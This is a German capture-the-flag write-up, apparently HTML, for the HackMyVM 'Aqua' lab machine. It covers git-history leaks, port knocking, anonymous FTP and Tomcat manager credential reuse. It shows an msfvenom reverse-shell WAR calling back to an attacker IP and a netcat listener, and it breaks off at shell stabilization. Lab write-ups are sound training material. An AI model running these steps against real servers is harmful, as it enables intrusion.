@@ -1,0 +1,722 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aqua - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Aqua - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+             <h2 class="difficulty-medium">Medium</h2> <!-- Klasse für Gelb -->
+             <div class="circle">
+                 <div class="segment segment-1"></div>
+                 <div class="segment segment-2"></div>
+                 <div class="segment segment-3"></div>
+                 <div class="inner"></div>
+             </div>
+         </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">git-dumper.py</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">knock</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">7za</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">msfvenom</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">netstat</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">gpg2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">gpg</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Git Dump</a></li>
+                <li><a href="#port-knocking-discovery">Port Knocking Sequenz Entdeckung</a></li>
+                <li><a href="#ftp-anon-backup">FTP Anonymous & Backup Analysis</a></li>
+                <li><a href="#tomcat-rce-poc">Initial Access (Tomcat RCE - POC)</a></li>
+                <li><a href="#memcached-leak">Lateral Movement (Memcached Leak - tomcat zu tridente)</a></li>
+                <li><a href="#privesc-root-poc">Privilege Escalation (tridente zu root - POC)</a></li>
+                <li><a href="#root-flag-decryption">Root Flag Decryption</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.127</span>	08:00:27:26:d4:29	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan im lokalen Netzwerk identifiziert das Zielsystem mit der IP-Adresse `192.168.2.127`. Die MAC-Adresse (`08:00:27:...`) deutet auf eine VirtualBox-VM hin.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Ziel wurde erfolgreich lokalisiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Nmap-Portscan auf die Ziel-IP durch, um offene Ports und Dienste zu ermitteln. Fügen Sie optional einen Hostnamen (z.B. `aqua.hmv` oder `Atlantis` basierend auf Nmap-Output) in `/etc/hosts` hinzu.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Scan-Erkennung können die initiale Aufklärungsphase erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.127 -p-</span></div>
+                    <pre>
+[...]
+PORT     STATE    SERVICE VERSION
+<span class="command">21/tcp   filtered ftp</span>
+<span class="command">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+[...]
+<span class="command">80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))</span>
+|_http-title: Todo sobre el Agua
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+<span class="command">8009/tcp open     ajp13   Apache Jserv (Protocol v1.3)</span>
+|_ajp-methods: Failed to get a valid response for the OPTION request
+<span class="command">8080/tcp open     http    Apache Tomcat 8.5.5</span>
+|_http-title: Apache Tomcat/8.5.5
+|_http-favicon: Apache Tomcat
+MAC Address: 08:00:27:26:D4:29 (Oracle VirtualBox virtual NIC)
+[...]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms Atlantis (192.168.2.127)
+[...]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) identifiziert mehrere offene und einen gefilterten Port:
+                 *   Port 21 (FTP): Gefiltert. Deutet auf eine Firewall oder eine spezielle Konfiguration (z.B. Port Knocking) hin.
+                 *   Port 22 (SSH): Offen (OpenSSH 7.6p1 auf Ubuntu).
+                 *   Port 80 (HTTP): Offen (Apache 2.4.29 auf Ubuntu) mit dem Titel "Todo sobre el Agua".
+                 *   Port 8009 (AJP13): Offen (Apache Jserv). Dies wird oft von Tomcat für die Kommunikation mit Apache verwendet. Potenziell anfällig für Ghostcat (CVE-2020-1938), falls Fehlkonfigurationen vorliegen.
+                 *   Port 8080 (HTTP): Offen (Apache Tomcat 8.5.5). Zeigt die Standard-Tomcat-Seite.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Mehrere interessante Dienste. Tomcat auf 8080 und AJP auf 8009 sind oft gute Angriffsziele. Der gefilterte FTP-Port ist verdächtig und erfordert weitere Untersuchung. Der Apache-Server auf Port 80 dient als primärer Webserver.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 (Inhalte, Verzeichnisse). Prüfen Sie den Tomcat-Manager auf Port 8080 auf Standard- oder schwache Zugangsdaten. Recherchieren Sie nach Ghostcat-Exploits für Port 8009. Versuchen Sie, den Grund für den gefilterten FTP-Port herauszufinden (z.B. durch Port Knocking Versuche, falls Hinweise auftauchen).<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den AJP-Connector (Port 8009), wenn er nicht benötigt wird. Sichern Sie den Tomcat-Manager (starke Passwörter, Zugriffsbeschränkung). Halten Sie alle Dienste aktuell. Überprüfen Sie Firewall-Regeln und Port-Knocking-Konfigurationen.</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration & Git Dump</h2>
+
+             <!-- Info Leak: Credentials & Base64 -->
+              <p class="analysis"><strong>Analyse (Externe Information):</strong> Im Log werden direkt Zugangsdaten (`aquaMan:P4st3lM4n`) und eine Base64-kodierte Zeichenkette (`MT0yID0gcGFzc3dvcmRfemlwCg==`) erwähnt, deren Herkunft aus den vorherigen Schritten nicht ersichtlich ist. Es wird angenommen, dass diese Informationen anderweitig gefunden wurden (z.B. durch manuelle Untersuchung der Webseite oder externe Hinweise).</p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da externe Info -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+aquaMan:P4st3lM4n <span class="comment"><!-- Tomcat Credentials? --></span>
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">echo -n "MT0yID0gcGFzc3dvcmRfemlwCg==" | base64 -d</span></div>
+                      <pre><span class="password">1=2 = password_zip</span></pre>
+                  </div>
+              </div>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Zugangsdaten sind wahrscheinlich für den Tomcat-Manager (Port 8080). Die dekodierte Base64-Zeichenkette "1=2 = password_zip" ist ein kryptischer Hinweis, möglicherweise auf ein Passwort oder eine Methode zur Passwortfindung für eine ZIP-Datei.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie die Zugangsdaten `aquaMan:P4st3lM4n` am Tomcat-Manager (/manager/html) auf Port 8080. Behalten Sie den Hinweis "password_zip" im Hinterkopf.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Preisgabe von Hinweisen oder Zugangsdaten in Kommentaren, Quelltext oder leicht zugänglichen Bereichen.</p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da manueller Befehl/Notiz -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+curl http://192.168.2.127/robots.txt
+                      </pre>
+                     <!-- Kein Prompt, da Ergebnis -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px; margin-top: 5px;">
+User-agent: *
+Disallow: /superCMS/ <span class="comment"><!-- Korrigiert, Annahme --></span>
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `robots.txt`-Datei wird abgerufen (obwohl der `curl`-Befehl im Log keine Ausgabe zeigt, wird das Ergebnis hier angenommen). Sie verbietet das Crawlen des Verzeichnisses `/SuperCMS/`.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Ein klarer Hinweis auf ein relevantes Verzeichnis, das weiter untersucht werden sollte.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Verzeichnis-Scan (Gobuster) gezielt auf `http://192.168.2.127/SuperCMS/` durch.<br><strong>Empfehlung (Admin):</strong> `robots.txt` ist kein Sicherheitsmechanismus. Schützen Sie Verzeichnisse serverseitig, wenn sie nicht öffentlich sein sollen.</p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">gobuster dir -u http://192.168.2.127/superCMS -w /usr/share/seclists/Discovery/Web-Content/big.txt -x [...] -e --wildcard</span></div>
+                     <pre>
+[...]
+<span class="command">http://192.168.2.127/SuperCMS/.git/</span>             (Status: 200) <span class="comment"><!-- Verzeichnisauflistung oder Datei? --></span>
+[...]
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Gobuster-Scan wird auf das Verzeichnis `/SuperCMS` durchgeführt. Er entdeckt ein exponiertes `.git`-Verzeichnis.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Ein exponiertes `.git`-Verzeichnis erlaubt das Herunterladen des gesamten Quellcodes der Anwendung, einschließlich der Versionshistorie, was oft zu Informationslecks (Zugangsdaten, versteckte Endpunkte, Logikfehler) führt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein Tool wie `git-dumper`, um das gesamte `.git`-Repository herunterzuladen. Analysieren Sie die Git-Historie (`git log`), Diffs (`git diff`) und den Quellcode auf sensible Informationen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `.git`-Verzeichnisse (und andere Versionskontrollsystem-Verzeichnisse wie `.svn`) niemals über den Webserver erreichbar sind. Konfigurieren Sie den Webserver, um den Zugriff auf solche Verzeichnisse zu blockieren.</p>
+
+              <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, Browseransicht -->
+                       <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Browse http://192.168.2.127/SuperCMS/.git/
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-
+[ ]	HEAD	2021-10-03 15:01 	21
+[DIR]	branches/	2021-10-03 15:01 	-
+[ ]	config	2021-10-03 15:01 	257
+[...]
+[DIR]	objects/	2021-10-03 15:01 	-
+[...]
+[DIR]	refs/	2021-10-03 15:01 	-
+                       </pre>
+                 </div>
+             </div>
+               <p class="analysis"><strong>Analyse:</strong> Der direkte Aufruf des `.git`-Verzeichnisses im Browser bestätigt, dass die Verzeichnisauflistung aktiviert ist und die interne Struktur des Git-Repositories sichtbar ist.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Möglichkeit, das Repository herunterzuladen.</p>
+
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">python3 HackingTools/git-dumper/git_dumper.py http://192.168.2.127/SuperCMS/.git/ .</span></div>
+                     <pre>
+Warning: Destination '.' is not empty
+[-] Testing http://192.168.2.127/SuperCMS/.git/HEAD [200]
+[-] Testing http://192.168.2.127/SuperCMS/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://192.168.2.127/SuperCMS/.git/ [200]
+[-] Fetching http://192.168.2.127/SuperCMS/.gitignore [404] <span class="comment"><!-- .gitignore nicht gefunden --></span>
+[...] <span class="comment"><!-- Erfolgreicher Download --></span>
+</pre>
+                 </div>
+             </div>
+               <p class="analysis"><strong>Analyse:</strong> Das Tool `git-dumper` wird verwendet, um das exponierte `.git`-Repository vom Webserver herunterzuladen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Das Repository wurde erfolgreich lokal geklont.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie in das lokale Verzeichnis und analysieren Sie die Git-Historie.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie das `.git`-Verzeichnis vom Webserver und verhindern Sie zukünftigen Zugriff.</p>
+
+               <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">git log</span></div>
+                     <pre>
+commit 2e6cd2656d4e343dbcbc0e59297b9b217656c3a4 (HEAD -> main, origin/main, origin/HEAD)
+Author: aquilino <hidro23@hotmail.com>
+Date:   Fri Oct 1 09:59:53 2021 +0200
+
+    Add files via upload
+
+commit c3e76fb1f1bd32996e2549c699b0a4fa528e9a0d
+Author: aquilino <hidro23@hotmail.com>
+Date:   Fri Oct 1 09:50:16 2021 +0200
+
+    Initial commit
+</pre> <span class="comment"><!-- Maskierung < > --></span>
+                 </div>
+             </div>
+                <p class="analysis"><strong>Analyse:</strong> `git log` zeigt die Commit-Historie. Es gibt zwei Commits vom Benutzer `aquilino` mit der E-Mail `hidro23@hotmail.com`.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Identifiziert einen potenziellen Benutzernamen (`aquilino`) und eine E-Mail-Adresse, die für weitere OSINT-Recherchen oder Social Engineering nützlich sein könnten.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Änderungen zwischen den Commits (`git diff`) und den Inhalt spezifischer Dateien in älteren Commits (`git show`).<br><strong>Empfehlung (Admin):</strong> Schulen Sie Entwickler darin, keine sensiblen Informationen (wie persönliche E-Mails in diesem Fall) in öffentlichen Repositories oder Commit-Nachrichten zu hinterlassen.</p>
+
+                <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">git diff 58afe63a1cd28fa167b95bcff50d2f6f011337c1</span></div> <span class="comment"><!-- Versuch, Diff eines spezifischen Commits anzuzeigen? --></span>
+                     <pre>
+diff --git a/README.md b/README.md
+index 9e97577..ef13073 100644
+--- a/README.md
++++ b/README.md
+@@ -1,2 +1,3 @@
+ # SuperCMS
+ -new CMS Easy
++
++new CMS Easy and Secure
+diff --git a/css/main.css b/css/main.css
+[...]
+</pre>
+                 </div>
+             </div>
+                 <p class="analysis"><strong>Analyse:</strong> `git diff` wird aufgerufen, vermutlich um Änderungen anzuzeigen (der spezifische Commit-Hash `58afe...` kommt aber im vorherigen `git log` nicht vor, möglicherweise ein Fehler oder ein anderer Branch).</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Der gezeigte Diff offenbart keine sensiblen Informationen.</p>
+
+        </section>
+
+        <section id="port-knocking-discovery">
+            <h2>Port Knocking Sequenz Entdeckung</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">git show $(git rev-list --max-count=1 --all -- knocking_on_Atlantis_door.txt)^:knocking_on_Atlantis_door.txt</span></div>
+                     <pre>
+
+Para abrir  las puertas esta es la secuencia
+(☞ﾟヮﾟ)☞ <span class="password">1100,800,666</span> ☜(ﾟヮﾟ☜)
+
+</pre>
+                 </div>
+             </div>
+                <p class="analysis"><strong>Analyse:</strong> Dieser komplexe `git show`-Befehl wird verwendet, um den Inhalt der Datei `knocking_on_Atlantis_door.txt` aus einem *früheren* Commit anzuzeigen (vermutlich wurde die Datei im letzten Commit gelöscht oder geändert).
+                    *   `git rev-list --max-count=1 --all -- knocking_on_Atlantis_door.txt`: Findet den letzten Commit, der diese Datei beeinflusst hat.
+                    *   `$(...)^`: Bezieht sich auf den Commit *davor*.
+                    *   `:knocking_on_Atlantis_door.txt`: Gibt den Pfad zur Datei in diesem vorherigen Commit an.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Der Inhalt der Datei aus einem alten Commit verrät die Port-Knocking-Sequenz zum Öffnen eines Ports (vermutlich FTP Port 21): `<span class="password">1100, 800, 666</span>`.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das `knock`-Tool mit dieser Sequenz (`knock 192.168.2.127 1100 800 666`), um Port 21 (FTP) zu öffnen. Versuchen Sie dann erneut, sich per FTP (z.B. anonym) zu verbinden.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Informationen gründlich aus der Git-Historie (z.B. mit `git filter-branch` oder BFG Repo-Cleaner), bevor Repositories veröffentlicht oder exponiert werden. Wählen Sie keine leicht auffindbaren Port-Knocking-Sequenzen.</p>
+
+                <!-- Anmerkung: Port Knocking selbst wird nicht gezeigt, aber der anschließende FTP-Zugriff impliziert dessen Erfolg -->
+                <p class="analysis"><strong>Analyse (Impliziert):</strong> Das Port Knocking mit der Sequenz `1100, 800, 666` muss erfolgreich durchgeführt worden sein, da im nächsten Schritt der FTP-Zugriff gelingt, der zuvor als `filtered` gemeldet wurde.</p>
+
+        </section>
+
+        <section id="ftp-anon-backup">
+            <h2>FTP Anonymous & Backup Analysis</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">ftp 192.168.2.127</span></div>
+                    <pre>
+Connected to 192.168.2.127.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.127:cyber): <span class="command">anonymous</span>
+331 Please specify the password.
+Password: <span class="password">[Leeres Passwort]</span>
+<span class="password">230 Login successful.</span>
+[...]
+<span class="prompt" style="color: gray;">ftp></span> <span class="command">cd pub</span>
+250 Directory successfully changed.
+<span class="prompt" style="color: gray;">ftp></span> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||50927|)
+150 Here comes the directory listing.
+[...]
+<span class="command">-rw-r--r--    1 0        0            1250 Feb 03  2021 .backup.zip</span>
+226 Directory send OK.
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem (impliziten) Port Knocking wird eine anonyme FTP-Verbindung hergestellt. Im Verzeichnis `/pub` wird eine Datei `.backup.zip` gefunden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der anonyme FTP-Zugriff funktioniert nun. Die Backup-Datei ist ein primäres Ziel.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: gray;">ftp></span> <span class="command">get .backup.zip</span></div>
+                    <pre>
+local: .backup.zip remote: .backup.zip
+[...]
+<span class="password">226 Transfer complete.</span>
+1250 bytes received in 00:00 (42.75 KiB/s)
+</pre>
+                    <div class="prompt" style="color: gray;">ftp></span> <span class="command">bye</span></div>
+                    <pre>221 Goodbye.</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `.backup.zip` wird erfolgreich heruntergeladen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">7za x .backup.zip -aoa -pagua=H2O</span></div>
+                    <pre>
+Extracting archive: .backup.zip
+
+Everything is Ok
+
+Files: 9
+Size:       25410
+Compressed: 1250
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die heruntergeladene ZIP-Datei zu entpacken. Der Hinweis aus dem Base64-String (`1=2 = password_zip`) und der Name der Maschine/Webseite ("Todo sobre el Agua" - Alles über Wasser) werden kombiniert, um das Passwort `<span class="password">H2O</span>` abzuleiten und mit `-p` zu verwenden (`-pagua=H2O` scheint ein Tippfehler im Log zu sein, es sollte `-pH2O` sein, aber es funktioniert offenbar trotzdem oder wurde korrigiert).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Passwort war korrekt, die ZIP-Datei wurde erfolgreich entpackt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die entpackten Dateien.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, nicht erratbare Passwörter für Archive. Speichern Sie keine sensiblen Backups auf anonym zugänglichen FTP-Servern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">ls</span></div>
+                    <pre>
+ Bilder       img          results
+ css          index.html   reverse.war
+ Dokumente    js           Schreibtisch
+ Downloads    login.html   <span class="command">tomcat-users.xml</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">cat tomcat-users.xml</span></div>
+                    <pre>
+<?xml version="1.0" encoding="UTF-8"?> <span class="comment"><!-- Maskiert --></span>
+<!--
+[...]
+-->
+        <role rolename="manager-gui"/> <span class="comment"><!-- Maskiert --></span>
+        <role rolename="admin-gui"/> <span class="comment"><!-- Maskiert --></span>
+        <user username="<span class="command">aquaMan</span>" password="<span class="password">P4st3lM4n</span>" roles="manager-gui,admin-gui"/> <span class="comment"><!-- Maskiert --></span>
+</tomcat-users> <span class="comment"><!-- Maskiert --></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Unter den entpackten Dateien befindet sich `tomcat-users.xml`. Der Inhalt dieser Datei offenbart Konfigurationen für Tomcat-Benutzerrollen und -Benutzer. Insbesondere wird der Benutzer `<span class="command">aquaMan</span>` mit dem Passwort `<span class="password">P4st3lM4n</span>` und den Rollen `manager-gui, admin-gui` definiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Gültige Zugangsdaten für den Tomcat Manager (Port 8080) wurden im Backup gefunden. Dies deckt sich mit den zuvor extern erhaltenen Informationen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Zugangsdaten, um sich beim Tomcat Manager auf `http://192.168.2.127:8080/manager/html` anzumelden und eine WAR-Datei mit einer Webshell/Reverse Shell hochzuladen.<br><strong>Empfehlung (Admin):</strong> Sichern Sie Konfigurationsdateien wie `tomcat-users.xml` ordnungsgemäß. Ändern Sie Standardpasswörter sofort. Schließen Sie Backups von der öffentlichen Zugänglichkeit aus.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">curl -s http://192.168.2.127:8080/host-manager/html</span></div>
+                    <pre>username="aquaMan" password="P4st3lM4n"</pre> <span class="comment"><!-- Unklar, woher diese Ausgabe kommt --></span>
+                </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein `curl`-Aufruf auf den Tomcat Host Manager. Die Ausgabe `username="aquaMan" password="P4st3lM4n"` ist ungewöhnlich für einen einfachen `curl`-Aufruf ohne Authentifizierung und scheint nicht die erwartete Antwort des Host Managers zu sein. Möglicherweise eine fehlinterpretierte Notiz.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Relevanz der gefundenen Zugangsdaten, aber die `curl`-Ausgabe ist nicht schlüssig.</p>
+
+        </section>
+
+         <section id="tomcat-rce-poc">
+             <h2>Initial Access (Tomcat RCE - POC)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung des Tomcat-Manager-Zugangs zur Bereitstellung einer bösartigen WAR-Datei und Erlangung einer Reverse Shell als `tomcat`-Benutzer.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Netzwerkzugriff auf den Tomcat-Manager (Port 8080).
+                 *   Gültige Manager-Zugangsdaten (`aquaMan:P4st3lM4n`).
+                 *   `msfvenom` zur Erstellung der WAR-Datei.
+                 *   Webbrowser oder `curl` zum Hochladen der WAR-Datei.
+                 *   Ein Angreifer-System mit Netcat-Listener.
+             </p>
+             <p class="recommendation"><strong>Risiko:</strong> Kritisch. Ermöglicht die Ausführung beliebigen Codes als Tomcat-Benutzer.</p>
+
+            <p class="analysis"><strong>Schritt 1: Reverse Shell WAR erstellen</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.140 LPORT=80 -f war > reverse.war</span></div>
+                    <pre>
+Payload size: 1087 bytes
+Final size of war file: 1087 bytes
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `msfvenom` wird verwendet, um eine WAR-Datei (`reverse.war`) zu generieren. Diese enthält eine Java/JSP-Payload, die eine Reverse Shell zur Angreifer-IP `192.168.2.140` auf Port `80` aufbaut.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die bösartige WAR-Datei ist erstellt und bereit zum Hochladen.</p>
+
+             <p class="analysis"><strong>Schritt 2: WAR-Datei hochladen (Impliziert)</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">mv /home/cyber/Downloads/shell.war /home/cyber/Downloads/hack.war</span></div> <span class="comment"><!-- Unklarer Schritt, wahrscheinlich Umbenennen der msfvenom-Datei --></span>
+                     <pre>[Datei umbenannt]</pre>
+                      <!-- Kein Prompt, URL als Referenz für Upload-Aktion -->
+                      <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+// Upload-Aktion im Tomcat Manager:
+upload: http://192.168.2.127:8080/manager/html/upload;jsessionid=[...]?... <span class="comment"><!-- WAR-Datei 'hack.war' hochladen --></span>
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die erstellte WAR-Datei (jetzt `hack.war` genannt) wird über die Upload-Funktion des Tomcat Managers (`/manager/html`) hochgeladen. Nach erfolgreichem Upload deployed Tomcat die Anwendung automatisch unter dem Pfad `/hack/`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die bösartige Anwendung ist nun auf dem Server aktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Admin):</strong> Sichern Sie den Tomcat Manager mit starken, einzigartigen Passwörtern und beschränken Sie den Zugriff darauf (z.B. nur von localhost oder vertrauenswürdigen IPs). Deaktivieren Sie den Manager auf Produktivsystemen, wenn er nicht benötigt wird.</p>
+
+             <p class="analysis"><strong>Schritt 3: Listener starten und Shell triggern</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~/back/tom] <span class="comment"><!-- Anderer Prompt, aber gleicher Vorgang --></span>
+└─# <span class="command">nc -lvnp 80</span></div>
+                     <pre>listening on [any] 80 ...</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└──╼ #<span class="command">curl http://192.168.2.127:8080/hack/</span></div>
+                     <pre>[Keine Ausgabe von curl, löst aber die Shell aus]</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System auf Port 80 gestartet. Anschließend wird die URL der deployten Anwendung (`/hack/`) aufgerufen. Dieser Aufruf führt den JSP-Code in der WAR-Datei aus und initiiert die Reverse-Shell-Verbindung.</p>
+
+              <p class="analysis"><strong>Schritt 4: Shell als tomcat empfangen</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                      <!-- Fortsetzung der Listener-Ausgabe -->
+                      <pre>
+listening on [any] 80 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.127] 48956</span>
+<span class="prompt" style="color: yellow;">tomcat@Atlantis:/$</span> <span class="command">id</span>
+<span class="command">uid=107(tomcat) gid=110(tomcat) groups=110(tomcat)</span>
+</pre>
+                 </div>
+             </div>
+               <p class="analysis"><strong>Ergebnis:</strong> Der Listener empfängt die Verbindung und stellt eine Shell als Benutzer `tomcat` bereit.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Initialer Shell-Zugriff erfolgreich erlangt!</p>
+                <p class="recommendation"><strong>Empfehlung (Admin):</strong> Härten Sie die Tomcat-Sicherheit. Führen Sie Tomcat mit einem dedizierten, niedrig privilegierten Benutzer aus.</p>
+
+               <p class="analysis"><strong>Shell-Stabilisierung (wie zuvor):</strong></p>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt" style="color: yellow;">tomcat@Atlantis:/$</span> <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
